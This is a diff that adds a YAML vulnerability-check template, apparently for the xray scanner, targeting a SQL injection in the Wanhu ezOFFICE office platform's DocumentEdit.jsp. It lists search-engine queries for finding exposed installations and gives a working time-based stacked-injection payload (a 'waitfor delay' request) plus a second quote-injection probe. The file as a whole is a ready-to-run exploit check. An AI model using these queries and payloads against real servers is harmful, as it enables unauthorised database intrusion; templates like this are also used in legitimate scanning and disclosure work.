@@ -1,0 +1,55 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="万户网络-ezOFFICE"
+    hunter-query: app.name="万户 Ezoffice OA"
+    quake-query: app:"万户ezOFFICE协同管理平台"
+    zoomeye-query: title:"万户ezOFFICE协同管理平台"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips: mssql | 叠堆注入 | 联合注入
+
+name: poc-yaml-wanhu-ezoffice-DocumentEdit.jsp;-sqli
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            follow_redirects: false
+            path: /defaultroot/public/iWebPDF/DocumentEdit.jsp;
+            headers:
+               Content-Type: application/x-www-form-urlencoded
+            body: RecordID=1';waitfor+delay+'0:0:4'--+    
+        expression: response.status == 200 && response.latency >= 4000
+
+        output:
+          search: |-
+            "(?P<filename>\\w+.jsp)".bsubmatch(response.body)
+          filename: search["filename"]
+          search1: |-
+            "(?P<newpath>ico.*jsp)".bsubmatch(response.body)
+          newpath: search["newpath"]
+
+    r1:
+        request:
+            cache: true
+            method: GET
+            follow_redirects: false
+            path: /defaultroot/public/iWebOfficeSign/DocumentEditExcel.jsp?RecordID=1%27
+            headers:
+            body:         
+        expression: response.status == 200 && response.latency >= 4000
+
+expression: r0() 
